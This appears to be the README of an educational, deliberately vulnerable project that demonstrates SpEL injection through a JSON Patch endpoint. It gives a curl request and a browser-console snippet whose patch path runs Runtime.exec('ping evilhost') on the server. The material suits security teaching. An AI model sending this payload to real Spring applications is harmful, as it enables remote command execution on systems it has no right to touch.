# SpELinj
Exemple for SpEL injection

Made for internship at St. Petersburg ETU LETI.

This project contains a SpEL injection vulnerability.

To exploit this vulnerability, you need to send a request to the server like:
>curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(java.lang.Runtime).getRuntime().exec(\"ping evilhost\").x", "value" : >"pwned" }]' "http://localhost/cars/1/"

or execute the following code in the browser console on the "Добавить объявление" page:
>$.ajax({            url: 'cars/1/',
>                    type: 'PATCH',
>                    data: JSON.stringify([{ "op" : "replace", "path" : "T(java.lang.Runtime).getRuntime().exec(\"ping evilhost\").x", "value" : "pwned" }]),
>                    contentType: 'application/json-patch+json; charset=utf-8',
>                    dataType: 'json-patch+json',
>                    async: false });
